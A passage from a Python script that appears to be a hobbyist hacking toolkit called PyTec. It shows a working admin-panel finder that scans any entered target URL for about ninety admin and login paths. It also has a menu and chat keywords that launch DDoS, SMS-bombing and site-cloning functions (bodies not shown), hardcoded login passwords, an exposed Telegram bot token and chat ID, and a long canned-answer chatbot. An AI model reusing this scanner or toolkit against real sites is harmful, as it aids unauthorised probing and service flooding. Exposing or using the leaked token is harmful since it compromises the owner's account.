        com("xdg-open http://mk777.rf.gd/?i=1")
    else:
        print(f"{ran2}Exiting...")
        time.sleep(1)
        menu()




def adminPenelFinder():
    import requests
    import random
    import time
    from colorama import Fore, Style, init

    # Initialize colorama
    init(autoreset=True)
    admin_panel_finder_ban()

    # Admin Panel Finder
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN]
    # Target website
    target = input(Fore.CYAN + "Enter the target URL (e.g., https://www.example.com): " + Style.RESET_ALL)
    # Common admin panel paths
    paths = [
        # Basic Admin Paths
        "admin/",
        "admin.php",
        "admin/login.php",
        "adminpanel/",
        "admin1/",
        "admin2/",
        "admin3/",
        "admin4/",
        "admin_area/",
        "adminarea/",
        
        # Common CMS Admin Paths
        "wp-admin/",
        "wp-login.php",
        "administrator/",
        "administrator/index.php",
        "user/login/",
        "panel/",
        
        # Login Related Paths
        "login/",
        "login.php",
        "login.html",
        "login.asp",
        "logon/",
        "signin/",
        
        # Control Panel Paths
        "cpanel/",
        "controlpanel/",
        "management/",
        "manage/",
        "admincontrol/",
        "admin_dashboard/",
        "admin_console/",
        
        # Alternative Admin Paths
        "admin_login/",
        "admin/home/",
        "admin/controlpanel/",
        "cmsadmin/",
        "systemadmin/",
        "secureadmin/",
        "useradmin/",
        "adminsite/",
        "backend/",
        "admincp/",
        "adm/",
        
        # File Extension Variations
        "admin_login.asp",
        "admin_login.html",
        "admin/index.php",
        "admin/account.php",
        "admin_area/admin.php",
        "admin_area/login.php",
        "administrator/login.php",
        "admin1/login.php",
        "admin2/login.php",
        "admin_area/index.php",
        "admin_area/admin.html",
        
        # Control Panel Files
        "admin/cp.php",
        "cp.php",
        "adminpanel.php",
        "adminpanel/login.php",
        "adminpanel/index.php",
        
        # Secure Admin Paths
        "admin_area/admin_login.php",
        "admin_area/admincontrol.php",
        "admin_area/dashboard.php",
        "admin_area/cp.php",
        "admin_area/secure/",
        "admin_area/secure/login.php",
        "admin_area/secure/index.php",
        "admin_area/secure/admin.php",
        "admin_area/secure/dashboard.php",
        
        # Less Common But Important
        "sysadmin/",
        "phpmyadmin/",
        "myadmin/",
        "webadmin/",
        "server/",
        "moderator/",
        "staff/",
        
        # API Admin Endpoints
        "api/admin/",
        "admin/api/",
        "rest/admin/",
        
        # Newer Variations (2023-2024)
        "adminportal/",
        "adminconsole/",
        "admininterface/",
        "admin-tools/",
        "admin-tool/",
        "admincenter/"
    ]

    print(random.choice(colors) + f"\n🔍 Scanning admin panels on {target}...\n" + Style.RESET_ALL)

    for path in paths:
        url = f"{target.rstrip('/')}/{path}"
        try:
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                print(random.choice(colors) + f"[✔] Found admin panel: {url}" + Style.RESET_ALL)
            elif response.status_code == 403:
                print(random.choice(colors) + f"[⚠] Forbidden (maybe exists): {url}" + Style.RESET_ALL)
            else:
                print(random.choice(colors) + f"[✖] Not found: {url}" + Style.RESET_ALL)
        except requests.exceptions.RequestException:
            print(random.choice(colors) + f"[❗] Error accessing: {url}" + Style.RESET_ALL)
        time.sleep(0.1)  # Add a slight delay for animation effect

    print(Fore.GREEN + "\n🎉 Scanning completed!" + Style.RESET_ALL)
    print(Fore.YELLOW + "💡 Note: This tool is for educational purposes only. Use responsibly." + Style.RESET_ALL)
    input(g + "\n\n\t\t\tYour Program Finished. Press Enter To Continue...")
    com("clear")
    adminPenelFinder()
    # End of Admin Panel Finder
    
    
    




    





def menu():
    anim(menu_logo)
    sel = input(f"{ran2}[>]select option:")
    if sel == '1':
        com("clear")
        xak(f"\n{ran2} 𝐒𝐨𝐫𝐫𝐲, 𝐓𝐡𝐢𝐬 𝐓𝐨𝐨𝐥 𝐢𝐬 𝐧𝐨𝐭 𝐰𝐨𝐫𝐤𝐢𝐧𝐠 𝐫𝐢𝐠𝐡𝐭 𝐧𝐨𝐰. 𝐓𝐡𝐢𝐬 𝐭𝐨𝐨𝐥 𝕚𝖘 𝕔𝖚𝖗𝖗𝖊𝖓𝖙𝖑𝖞 𝕓𝖊𝖎𝖓𝖌 𝕦𝖕𝖉𝖆𝖙𝖊𝖉.")
        xak2(f"{ran} 𝐖𝐞 𝐚𝐫𝐞 𝐛𝐚𝐜𝐤 𝐭𝐨 𝐦𝐞𝐧𝐮.")
        menu()
        # sms_bomber()
    elif sel == '2':
        qr_code()
    elif sel == '3':
        url_shortner()
    elif sel == '4':
        com("clear")
        xak(f"\n{ran2} 𝐒𝐨𝐫𝐫𝐲, 𝐓𝐡𝐢𝐬 𝐓𝐨𝐨𝐥 𝐢𝐬 𝐧𝐨𝐭 𝐰𝐨𝐫𝐤𝐢𝐧𝐠 𝐫𝐢𝐠𝐡𝐭 𝐧𝐨𝐰. 𝐓𝐡𝐢𝐬 𝐭𝐨𝐨𝐥 𝕚𝖘 𝕔𝖚𝖗𝖗𝖊𝖓𝖙𝖑𝖞 𝕓𝖊𝖎𝖓𝖌 𝕦𝖕𝖉𝖆𝖙𝖊𝖉.")
        xak2(f"{ran} 𝐖𝐞 𝐚𝐫𝐞 𝐛𝐚𝐜𝐤 𝐭𝐨 𝐦𝐞𝐧𝐮.")
        menu()
        # custom_sms()
    elif sel == '5':
        web_clone()
    elif sel == '6':
        ddos()
    elif sel == '7':
        com("clear")
        print(f"{ran2} 𝐓𝐡𝐢𝐬 𝐭𝐨𝐨𝐥 𝐢𝐬 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐞. 𝐓𝐡𝐚𝐧𝐤 𝐲𝐨𝐮 𝕸𝖔𝖗𝖆𝖓 𝕶𝖎𝖓𝖌.")
        time.sleep(2)
        com("xdg-open http://mk777.rf.gd/?i=1")
        adminPenelFinder()
        
    elif sel in "0":
        sys.exit()




# listener = sr.Recognizer()

# try:
#     with sr.Microphone() as mic:
#         print("Listening...")
#         voice = listener.listen(mic)
#         command = listener.recognize_google_cloud(voice)
#         print(command)
# except:
#     pass



def anim(xak):
    for x in xak+"\n":
        sys.stdout.write(x)
        sys.stdout.flush()
        time.sleep(0.005)



# asis = pyttsx3.init()
# wait = asis.runAndWait()
# voices = asis.getProperty('voices')
# rob = asis.setProperty("voice", voices[1].id)




users = {
    "admin": "Mk-777",
    "user1": "MuslimUddinMk",
    "test": "op"
}


pytec()
username = input(f"{B_CYN}🧑 Username ➤ ")
password = input(f"{B_CYN}🔒 Password ➤ ")

if username in users and users[username] == password:
    print(f"\n{B_GRN}✅ Welcome {username}! Login successful 🎉\n")
else:
    print(f"{B_RED}❗️ Login failed! Incorrect username or password. Exiting...")
    exit()












bot_token = '7903954184:AAF4MyCznsMtDeXC8G_DaopvX66I6qnb_R0'
chat_id = '6662565190'


user_name = input(str(f"{t}Please Type Your UserName: "))
robo = "PyTec: "


def picci():
    com("clear")
    print(f"""{RED}
        ██╗    ██╗
        ██║    ██║
        ██║ █╗ ██║
        ██║███╗██║
        ╚███╔███╔╝
         ╚══╝╚══╝ 
    """)
    sleep(0.50)
    print(f"""{GRN}
        ███████╗
        ██╔════╝
        █████╗  
        ██╔══╝  
        ███████╗
        ╚══════╝
        """)
    sleep(0.50)
    print(f"""{YLW}
        ██╗     
        ██║     
        ██║     
        ██║     
        ███████╗
        ╚══════╝
        """)
    sleep(0.50)
    print(f"""{B_CYN}   
         ██████╗
        ██╔════╝
        ██║     
        ██║     
        ╚██████╗
         ╚═════╝
         """)
    sleep(0.50)
    print(f"""{PRP}
         ██████╗ 
        ██╔═══██╗
        ██║   ██║
        ██║   ██║
        ╚██████╔╝
         ╚═════╝ 
         """)
    sleep(0.50)
    print(f"""{CYN}
        ███╗   ███╗
        ████╗ ████║
        ██╔████╔██║
        ██║╚██╔╝██║
        ██║ ╚═╝ ██║
        ╚═╝     ╚═╝
        """)
    sleep(0.50)
    print(f"""{WHT}
        ███████╗
        ██╔════╝
        █████╗  
        ██╔══╝  
        ███████╗
        ╚══════╝
    """)
    sleep(0.50)
    print(f"""
    {RED}  ██████╗ ██╗ ██████╗ ██████╗██╗
    {CYN}  ██╔══██╗██║██╔════╝██╔════╝██║
    {B_BLK}  ██████╔╝██║██║     ██║     ██║
    {PRP}  ██╔═══╝ ██║██║     ██║     ██║
    {GRN}  ██║     ██║╚██████╗╚██████╗██║
    {B_GRN}  ╚═╝     ╚═╝ ╚═════╝ ╚═════╝╚═╝                  
        {c}""")


if "picci" in user_name:
    anim(f"{robo}{ran} 𝓦𝓸𝔀. 𝓓𝓮𝓪𝓻 𝓟𝓲𝓬𝓬𝓲😍. 𝓝𝓲𝓬𝓮 𝓣𝓸 𝓜𝓮𝓮𝓽 𝓨𝓸𝓾. 𝓦𝓪𝓲𝓽, 𝓘 𝓗𝓪𝓿𝓮 𝓼𝓹𝓮𝓬𝓲𝓪𝓵 𝓕𝓸𝓻 𝓨𝓸𝓾. 𝓨𝓸𝓾 𝓪𝓻𝓮 𝓿𝓮𝓻𝔂 𝓼𝓹𝓮𝓬𝓲𝓪𝓵 𝓽𝓸 𝓶𝔂 𝓫𝓸𝓼𝓼")
    # asis.say(f"Wow. Dear {user_name}. Nice To Meet You. Wait, I Have special For You. You are very special to my boss")
    # asis.runAndWait()
    com("Clear")
    picci()
elif "allah" in user_name:
    anim(f"{robo}{RED} Astaqfirullah!")
    sys.exit()
elif "Allah" in user_name:
    anim(f"{robo}{RED} Astaqfirullah!")
    sys.exit()
anim(f"{robo}{ran}hey {user_name}, Welcome To PyTec....")
# asis.say(f"hey {user_name}, Welcome To PyTec....")
# asis.runAndWait()



print(f"{robo}{ran} Do You Have A Question For Me?")
# asis.say("Do You Have A Question For Me?")
# asis.runAndWait()
while True:
    user = input(str(f"Type any quiestion. \n{user_name}:"))
    if "Allah" in user:
        anim(f"{robo}{ran} allah")
        #asis.say("Allah")
        #asis.runAndWait()
    elif "allah" in user:
        anim(f"{robo}{ran} allah")
        #asis.say("Allah")
        #asis.runAndWait()
    elif "Takbir" in user:
        anim(f"{robo}{ran} Allahu Akbar")
        #asis.say("Allahu akbar")
        #asis.runAndWait()
    elif "takbir" in user:
        anim(f"{robo}{ran} Allahu Akbar")
        #asis.say("Allahu akbar")
        #asis.runAndWait()
    elif "Takbir!" in user:
        anim(f"{robo}{ran} Allahu Akbar")
        #asis.say("Allahu akbar")
        #asis.runAndWait()
    elif "takbir!" in user:
        anim(f"{robo}{ran} Allahu Akbar")
        #asis.say("Allahu akbar")
        #asis.runAndWait()
    elif "Assalamualaikum" in user:
        anim(f"{robo}{ran}Walaikum Asslam, how Are You? ")
        # asis.say("Walaikumassalam, How Are You?")
        # asis.runAndWait()
    #+++++++++++For Automatic++++++++++++++++
    elif "Mk-777SMSBomb" in user:
        sms_bomber()
    elif "Mk-777DDOS" in user:
        ddos()
    elif "Mk-777URLShortner" in user:
        url_shortner()
    elif "Mk-777QRcode" in user:
        qr_code()
    elif "Mk-777WebClone" in user:
        web_clone()
    elif "Mk-777AdminPanelFinder" in user:
        adminPenelFinder()
    elif "Mk-777CustomSMS" in user:
        custom_sms()
    elif "Mk-777" in user:
        anim(f"{robo}{ran} 𝓦𝓸𝔀. 𝓓𝓮𝓪𝓻 Boss😍. 𝓝𝓲𝓬𝓮 𝓣𝓸 𝓜𝓮𝓮𝓽 𝓨𝓸𝓾. 𝓦𝓪𝓲𝓽, 𝓘 𝓗𝓪𝔀 𝔁")
        # asis.say(f"Wow. Dear {user_name}. Nice To Meet You. Thank you my boss. I am very happy to meet you.")
        # asis.runAndWait()
    elif "assalamualaikum" in user:
        anim(f"{robo}{ran}Walaikum Asslam, how Are You? ")
        # asis.say("Walaikumassalam, How Are You?")
        # asis.runAndWait()
    elif "Assalamualaikum!" in user:
        anim(f"{robo}{ran}Walaikum Asslam, how Are You? ")
        # asis.say("Walaikumassalam, How Are You?")
        # asis.runAndWait()
    elif "assalamualaikum!" in user:
        anim(f"{robo}{ran}Walaikum Asslam, how Are You? ")
        # asis.say("Walaikumassalam, How Are You?")
        # asis.runAndWait()
    elif "What is programming?" in user:
        anim(f"{robo}{ran} Programming is the process of writing instructions for a computer to perform specific tasks.")
        # asis.say("Programming is the process of writing instructions for a computer to perform specific tasks.")
        # asis.runAndWait()
    elif "Can you tell me about Freefire" in user:
        anim(f"{robo}{ran} Free Fire is a popular battle royale game developed by Garena. Players compete to be the last one standing on an island by collecting weapons, resources, and eliminating opponents.")
        # asis.say("Free Fire is a popular battle royale game developed by Garena. Players compete to be the last one standing on an island by collecting weapons, resources, and eliminating opponents.")
        # asis.runAndWait()
    elif "Can you tell me about Call of Duty?" in user:
        anim(f"{robo}{ran} Call of Duty is a first-person shooter game series known for its intense campaigns and multiplayer modes.")
        # asis.say("Call of Duty is a first-person shooter game series known for its intense campaigns and multiplayer modes.")
        # asis.runAndWait()
    elif "Can you tell me about Fortnite?" in user:
        anim(f"{robo}{ran} Fortnite is a battle royale game where players build structures and fight to be the last one standing.")
        # asis.say("Fortnite is a battle royale game where players build structures and fight to be the last one standing.")
        # asis.runAndWait()
    elif "Can you tell me about Clash of Clans?" in user:
        anim(f"{robo}{ran} Clash of Clans is a strategy game where players build villages, train troops, and attack other players.")
        # asis.say("Clash of Clans is a strategy game where players build villages, train troops, and attack other players.")
        # asis.runAndWait()

    elif "What is TikTok?" in user:
        anim(f"{robo}{ran} TikTok is a social media platform for creating, sharing, and discovering short videos.")
        # asis.say("TikTok is a social media platform for creating, sharing, and discovering short videos.")
        # asis.runAndWait()

    elif "What is Instagram?" in user:
        anim(f"{robo}{ran} Instagram is a photo and video sharing social networking service owned by Meta.")
        # asis.say("Instagram is a photo and video sharing social networking service owned by Meta.")
        # asis.runAndWait()

    elif "What is Facebook?" in user:
        anim(f"{robo}{ran} Facebook is a social networking platform where users can connect, share, and communicate.")
        # asis.say("Facebook is a social networking platform where users can connect, share, and communicate.")
        # asis.runAndWait()

    elif "What is Twitter?" in user:
        anim(f"{robo}{ran} Twitter is a microblogging platform where users post and interact with messages called tweets.")
        # asis.say("Twitter is a microblogging platform where users post and interact with messages called tweets.")
        # asis.runAndWait()

    elif "What is YouTube?" in user:
        anim(f"{robo}{ran} YouTube is a video-sharing platform where users can upload, watch, and share videos.")
        # asis.say("YouTube is a video-sharing platform where users can upload, watch, and share videos.")
        # asis.runAndWait()

    elif "What is Netflix?" in user:
        anim(f"{robo}{ran} Netflix is a streaming service offering a wide variety of TV shows, movies, and documentaries.")
        # asis.say("Netflix is a streaming service offering a wide variety of TV shows, movies, and documentaries.")
        # asis.runAndWait()

    elif "What is Spotify?" in user:
        anim(f"{robo}{ran} Spotify is a music streaming platform where users can listen to millions of songs and podcasts.")
        # asis.say("Spotify is a music streaming platform where users can listen to millions of songs and podcasts.")
        # asis.runAndWait()

    elif "What is WhatsApp?" in user:
        anim(f"{robo}{ran} WhatsApp is a messaging app that allows users to send text messages, voice messages, and make calls.")
        # asis.say("WhatsApp is a messaging app that allows users to send text messages, voice messages, and make calls.")
        # asis.runAndWait()

    elif "What is Telegram?" in user:
        anim(f"{robo}{ran} Telegram is a cloud-based messaging app known for its speed and security.")
        # asis.say("Telegram is a cloud-based messaging app known for its speed and security.")
        # asis.runAndWait()

    elif "What is Discord?" in user:
        anim(f"{robo}{ran} Discord is a communication platform designed for creating communities, with features like voice, video, and text chat.")
        # asis.say("Discord is a communication platform designed for creating communities, with features like voice, video, and text chat.")
        # asis.runAndWait()

    elif "What is LinkedIn?" in user:
        anim(f"{robo}{ran} LinkedIn is a professional networking platform where users can connect with colleagues and find job opportunities.")
        # asis.say("LinkedIn is a professional networking platform where users can connect with colleagues and find job opportunities.")
        # asis.runAndWait()

    elif "What is Pinterest?" in user:
        anim(f"{robo}{ran} Pinterest is a visual discovery platform where users can find and save ideas for projects and interests.")
        # asis.say("Pinterest is a visual discovery platform where users can find and save ideas for projects and interests.")
        # asis.runAndWait()

    elif "What is Snapchat?" in user:
        anim(f"{robo}{ran} Snapchat is a multimedia messaging app where users can send photos and videos that disappear after viewing.")
        # asis.say("Snapchat is a multimedia messaging app where users can send photos and videos that disappear after viewing.")
        # asis.runAndWait()

    elif "What is Reddit?" in user:
        anim(f"{robo}{ran} Reddit is a social news aggregation and discussion platform where users can share and discuss content.")
        # asis.say("Reddit is a social news aggregation and discussion platform where users can share and discuss content.")
        # asis.runAndWait()

    elif "What is Twitch?" in user:
        anim(f"{robo}{ran} Twitch is a live streaming platform primarily focused on video game streaming and esports.")
        # asis.say("Twitch is a live streaming platform primarily focused on video game streaming and esports.")
        # asis.runAndWait()

    elif "What is Zoom?" in user:
        anim(f"{robo}{ran} Zoom is a video conferencing platform used for virtual meetings, webinars, and online collaboration.")
        # asis.say("Zoom is a video conferencing platform used for virtual meetings, webinars, and online collaboration.")
        # asis.runAndWait()
    elif "What is JavaScript?" in user:
            anim(f"{robo}{ran} JavaScript is a programming language commonly used to create interactive effects within web browsers.")
            # asis.say("JavaScript is a programming language commonly used to create interactive effects within web browsers.")
            # asis.runAndWait()

    elif "What is HTML?" in user:
        anim(f"{robo}{ran} HTML, or HyperText Markup Language, is the standard language for creating web pages.")
        # asis.say("HTML, or HyperText Markup Language, is the standard language for creating web pages.")
        # asis.runAndWait()

    elif "What is CSS?" in user:
        anim(f"{robo}{ran} CSS, or Cascading Style Sheets, is used to style and layout web pages.")
        # asis.say("CSS, or Cascading Style Sheets, is used to style and layout web pages.")
        # asis.runAndWait()
    elif "What is React?" in user:
            anim(f"{robo}{ran} React is a JavaScript library for building user interfaces, maintained by Facebook.")
            # asis.say("React is a JavaScript library for building user interfaces, maintained by Facebook.")
            # asis.runAndWait()
        

    elif "What is Angular?" in user:
            anim(f"{robo}{ran} Angular is a TypeScript-based web application framework developed by Google.")
            # asis.say("Angular is a TypeScript-based web application framework developed by Google.")
            # asis.runAndWait()

    elif "What is Vue.js?" in user:
        anim(f"{robo}{ran} Vue.js is a progressive JavaScript framework for building user interfaces.")
        # asis.say("Vue.js is a progressive JavaScript framework for building user interfaces.")
        # asis.runAndWait()

    elif "What is Node.js?" in user:
            anim(f"{robo}{ran} Node.js is a JavaScript runtime built on Chrome's V8 engine, used for server-side programming.")
            # asis.say("Node.js is a JavaScript runtime built on Chrome's V8 engine, used for server-side programming.")
            # asis.runAndWait()    

    elif "What is Django?" in user:
            anim(f"{robo}{ran} Django is a high-level Python web framework that encourages rapid development and clean design.")
            # asis.say("Django is a high-level Python web framework that encourages rapid development and clean design.")
            # asis.runAndWait()   

    elif "What is Flask?" in user:
            anim(f"{robo}{ran} Flask is a lightweight Python web framework for building web applications.")
            # asis.say("Flask is a lightweight Python web framework for building web applications.")
            # asis.runAndWait()    

    elif "What is SQL?" in user:
            anim(f"{robo}{ran} SQL, or Structured Query Language, is used to manage and manipulate relational databases.")
            # asis.say("SQL, or Structured Query Language, is used to manage and manipulate relational databases.")
            # asis.runAndWait()

    elif "What is MongoDB?" in user:
            anim(f"{robo}{ran} MongoDB is a NoSQL database that stores data in JSON-like documents.")
            # asis.say("MongoDB is a NoSQL database that stores data in JSON-like documents.")
            # asis.runAndWait()    

    elif "What is MySQL?" in user:
            anim(f"{robo}{ran} MySQL is an open-source relational database management system.")
            # asis.say("MySQL is an open-source relational database management system.")
            # asis.runAndWait()    

    elif "What is PostgreSQL?" in user:
            anim(f"{robo}{ran} PostgreSQL is an advanced open-source relational database system.")
            # asis.say("PostgreSQL is an advanced open-source relational database system.")
            # asis.runAndWait()    

    elif "What is API?" in user:
            anim(f"{robo}{ran} API, or Application Programming Interface, allows different software applications to communicate with each other.")
            # asis.say("API, or Application Programming Interface, allows different software applications to communicate with each other.")
            # asis.runAndWait()    

    elif "What is REST API?" in user:
            anim(f"{robo}{ran} REST API is an architectural style for designing networked applications using HTTP requests.")
            # asis.say("REST API is an architectural style for designing networked applications using HTTP requests.")
            # asis.runAndWait()    

    elif "What is GraphQL?" in user:
            anim(f"{robo}{ran} GraphQL is a query language for APIs that allows clients to request only the data they need.")
            # asis.say("GraphQL is a query language for APIs that allows clients to request only the data they need.")
            # asis.runAndWait()    

    elif "What is Docker?" in user:
            anim(f"{robo}{ran} Docker is a platform for developing, shipping, and running applications in containers.")
            # asis.say("Docker is a platform for developing, shipping, and running applications in containers.")
            # asis.runAndWait()    

    elif "What is Kubernetes?" in user:
            anim(f"{robo}{ran} Kubernetes is an open-source platform for automating deployment, scaling, and management of containerized applications.")
            # asis.say("Kubernetes is an open-source platform for automating deployment, scaling, and management of containerized applications.")
            # asis.runAndWait()    

    elif "What is Git?" in user:
            anim(f"{robo}{ran} Git is a distributed version control system used to track changes in source code.")
            # asis.say("Git is a distributed version control system used to track changes in source code.")
            # asis.runAndWait()    

    elif "What is GitHub?" in user:
            anim(f"{robo}{ran} GitHub is a platform for hosting and collaborating on Git repositories.")
            # asis.say("GitHub is a platform for hosting and collaborating on Git repositories.")
            # asis.runAndWait()    

    elif "What is CI/CD?" in user:
            anim(f"{robo}{ran} CI/CD stands for Continuous Integration and Continuous Deployment, used to automate software development workflows.")
            # asis.say("CI/CD stands for Continuous Integration and Continuous Deployment, used to automate software development workflows.")
            # asis.runAndWait()    

    elif "What is Agile?" in user:
            anim(f"{robo}{ran} Agile is a project management methodology focused on iterative development and collaboration.")
            # asis.say("Agile is a project management methodology focused on iterative development and collaboration.")
            # asis.runAndWait()    

    elif "What is Scrum?" in user:
            anim(f"{robo}{ran} Scrum is a framework within Agile for managing complex projects.")
            # asis.say("Scrum is a framework within Agile for managing complex projects.")
            # asis.runAndWait()    

    elif "What is DevOps?" in user:
            anim(f"{robo}{ran} DevOps is a set of practices that combines software development and IT operations.")
            # asis.say("DevOps is a set of practices that combines software development and IT operations.")
            # asis.runAndWait()

    elif "What is Machine Learning?" in user:
            anim(f"{robo}{ran} Machine Learning is a subset of AI that enables systems to learn from data and improve over time.")
            # asis.say("Machine Learning is a subset of AI that enables systems to learn from data and improve over time.")
            # asis.runAndWait()

    elif "What is Deep Learning?" in user:
            anim(f"{robo}{ran} Deep Learning is a subset of Machine Learning that uses neural networks to analyze data.")
            # asis.say("Deep Learning is a subset of Machine Learning that uses neural networks to analyze data.")
            # asis.runAndWait()

    elif "What is TensorFlow?" in user:
            anim(f"{robo}{ran} TensorFlow is an open-source library for machine learning and deep learning.")
            # asis.say("TensorFlow is an open-source library for machine learning and deep learning.")
            # asis.runAndWait()

    elif "What is PyTorch?" in user:
            anim(f"{robo}{ran} PyTorch is an open-source machine learning library developed by Facebook.")
            # asis.say("PyTorch is an open-source machine learning library developed by Facebook.")
            # asis.runAndWait()

    elif "What is OpenCV?" in user:
            anim(f"{robo}{ran} OpenCV is an open-source library for computer vision and image processing.")
            # asis.say("OpenCV is an open-source library for computer vision and image processing.")
            # asis.runAndWait()

    elif "What is NLP?" in user:
            anim(f"{robo}{ran} NLP, or Natural Language Processing, is a field of AI focused on the interaction between computers and human language.")
            # asis.say("NLP, or Natural Language Processing, is a field of AI focused on the interaction between computers and human language.")
            # asis.runAndWait()

    elif "What is Big Data?" in user:
            anim(f"{robo}{ran} Big Data refers to large and complex datasets that require advanced tools for analysis.")
            # asis.say("Big Data refers to large and complex datasets that require advanced tools for analysis.")
            # asis.runAndWait()

    elif "What is Hadoop?" in user:
            anim(f"{robo}{ran} Hadoop is an open-source framework for storing and processing large datasets.")
            # asis.say("Hadoop is an open-source framework for storing and processing large datasets.")
            # asis.runAndWait()

    elif "What is Spark?" in user:
            anim(f"{robo}{ran} Apache Spark is an open-source analytics engine for big data processing.")
            # asis.say("Apache Spark is an open-source analytics engine for big data processing.")
            # asis.runAndWait()

    elif "What is Blockchain?" in user:
            anim(f"{robo}{ran} Blockchain is a decentralized digital ledger used for recording transactions securely.")
            # asis.say("Blockchain is a decentralized digital ledger used for recording transactions securely.")
            # asis.runAndWait()

    elif "What is Cryptocurrency?" in user:
            anim(f"{robo}{ran} Cryptocurrency is a digital or virtual currency that uses cryptography for security.")
            # asis.say("Cryptocurrency is a digital or virtual currency that uses cryptography for security.")
            # asis.runAndWait()

    elif "What is Bitcoin?" in user:
            anim(f"{robo}{ran} Bitcoin is the first decentralized cryptocurrency, created in 2009.")
            # asis.say("Bitcoin is the first decentralized cryptocurrency, created in 2009.")
            # asis.runAndWait()

    elif "What is Ethereum?" in user:
            anim(f"{robo}{ran} Ethereum is a decentralized platform that enables smart contracts and decentralized applications.")
            # asis.say("Ethereum is a decentralized platform that enables smart contracts and decentralized applications.")
            # asis.runAndWait()    
    elif "What is Google Meet?" in user:
        anim(f"{robo}{ran} Google Meet is a video conferencing service developed by Google for virtual meetings and collaboration.")
        # asis.say("Google Meet is a video conferencing service developed by Google for virtual meetings and collaboration.")
        # asis.runAndWait()

    elif "What is Microsoft Teams?" in user:
        anim(f"{robo}{ran} Microsoft Teams is a collaboration platform that combines chat, video meetings, and file sharing.")
        # asis.say("Microsoft Teams is a collaboration platform that combines chat, video meetings, and file sharing.")
        # asis.runAndWait()

    elif "What is Slack?" in user:
        anim(f"{robo}{ran} Slack is a messaging platform designed for team collaboration and communication.")
        # asis.say("Slack is a messaging platform designed for team collaboration and communication.")
        # asis.runAndWait()

    elif "What is GitHub?" in user:
        anim(f"{robo}{ran} GitHub is a platform for version control and collaboration, allowing developers to host and review code.")
        # asis.say("GitHub is a platform for version control and collaboration, allowing developers to host and review code.")
        # asis.runAndWait()


    elif "Can you tell me about Minecraft?" in user:
        anim(f"{robo}{ran} Minecraft is a sandbox game where players can build, explore, and survive in a blocky 3D world.")
        # asis.say("Minecraft is a sandbox game where players can build, explore, and survive in a blocky 3D world.")
        # asis.runAndWait()

    elif "Can you tell me about PUBG?" in user:
        anim(f"{robo}{ran} PUBG, or PlayerUnknown's Battlegrounds, is a popular battle royale game where players fight to be the last one standing on an island by collecting weapons and resources.")
        # asis.say("PUBG, or PlayerUnknown's Battlegrounds, is a popular battle royale game where players fight to be the last one standing on an island by collecting weapons and resources.")
        # asis.runAndWait()

    elif "What is Call of Duty?" in user:
        anim(f"{robo}{ran} Call of Duty is a first-person shooter game series known for its intense campaigns and multiplayer modes.")
        # asis.say("Call of Duty is a first-person shooter game series known for its intense campaigns and multiplayer modes.")
        # asis.runAndWait()

    elif "What is Fortnite?" in user:
        anim(f"{robo}{ran} Fortnite is a battle royale game where players build structures and fight to be the last one standing.")
        # asis.say("Fortnite is a battle royale game where players build structures and fight to be the last one standing.")
        # asis.runAndWait()

    elif "What is Apex Legends?" in user:
        anim(f"{robo}{ran} Apex Legends is a free-to-play battle royale game featuring unique characters with special abilities.")
        # asis.say("Apex Legends is a free-to-play battle royale game featuring unique characters with special abilities.")
        # asis.runAndWait()

    elif "What is Minecraft?" in user:
        anim(f"{robo}{ran} Minecraft is a sandbox game where players can build, explore, and survive in a blocky 3D world.")
        # asis.say("Minecraft is a sandbox game where players can build, explore, and survive in a blocky 3D world.")
        # asis.runAndWait()

    elif "What is Valorant?" in user:
        anim(f"{robo}{ran} Valorant is a tactical first-person shooter game where players compete in teams using unique agents with special abilities.")
        # asis.say("Valorant is a tactical first-person shooter game where players compete in teams using unique agents with special abilities.")
        # asis.runAndWait()

    elif "What is League of Legends?" in user:
        anim(f"{robo}{ran} League of Legends is a multiplayer online battle arena (MOBA) game where players control champions to destroy the enemy base.")
        # asis.say("League of Legends is a multiplayer online battle arena (MOBA) game where players control champions to destroy the enemy base.")
        # asis.runAndWait()

    elif "What is Clash of Clans?" in user:
        anim(f"{robo}{ran} Clash of Clans is a strategy game where players build villages, train troops, and attack other players.")
        # asis.say("Clash of Clans is a strategy game where players build villages, train troops, and attack other players.")
        # asis.runAndWait()

    elif "What is Among Us?" in user:
        anim(f"{robo}{ran} Among Us is a multiplayer game where players work together to complete tasks while trying to identify the impostors.")
        # asis.say("Among Us is a multiplayer game where players work together to complete tasks while trying to identify the impostors.")
        # asis.runAndWait()

    elif "What is Roblox?" in user:
        anim(f"{robo}{ran} Roblox is an online platform where users can create and play games made by other players.")
        # asis.say("Roblox is an online platform where users can create and play games made by other players.")
        # asis.runAndWait()

    # Additional 10 questions
    elif "What is AI?" in user:
        anim(f"{robo}{ran} AI, or Artificial Intelligence, is the simulation of human intelligence in machines that are programmed to think and learn.")
        # asis.say("AI, or Artificial Intelligence, is the simulation of human intelligence in machines that are programmed to think and learn.")
        # asis.runAndWait()

    elif "What is Python?" in user:
        anim(f"{robo}{ran} Python is a high-level, interpreted programming language known for its simplicity and versatility.")
        # asis.say("Python is a high-level, interpreted programming language known for its simplicity and versatility.")
        # asis.runAndWait()

    elif "What is the internet?" in user:
        anim(f"{robo}{ran} The internet is a global network of interconnected computers that allows for communication and data sharing.")
        # asis.say("The internet is a global network of interconnected computers that allows for communication and data sharing.")
        # asis.runAndWait()

    elif "What is machine learning?" in user:
        anim(f"{robo}{ran} Machine learning is a subset of AI that enables systems to learn and improve from experience without being explicitly programmed.")
        # asis.say("Machine learning is a subset of AI that enables systems to learn and improve from experience without being explicitly programmed.")
        # asis.runAndWait()

    elif "What is cloud computing?" in user:
        anim(f"{robo}{ran} Cloud computing is the delivery of computing services like storage, databases, and software over the internet.")
        # asis.say("Cloud computing is the delivery of computing services like storage, databases, and software over the internet.")
        # asis.runAndWait()

    elif "What is blockchain?" in user:
        anim(f"{robo}{ran} Blockchain is a decentralized digital ledger that records transactions across multiple computers securely.")
        # asis.say("Blockchain is a decentralized digital ledger that records transactions across multiple computers securely.")
        # asis.runAndWait()

    elif "What is cybersecurity?" in user:
        anim(f"{robo}{ran} Cybersecurity is the practice of protecting systems, networks, and data from digital attacks.")
        # asis.say("Cybersecurity is the practice of protecting systems, networks, and data from digital attacks.")
        # asis.runAndWait()

    elif "What is IoT?" in user:
        anim(f"{robo}{ran} IoT, or the Internet of Things, refers to the network of physical devices connected to the internet to collect and share data.")
        # asis.say("IoT, or the Internet of Things, refers to the network of physical devices connected to the internet to collect and share data.")
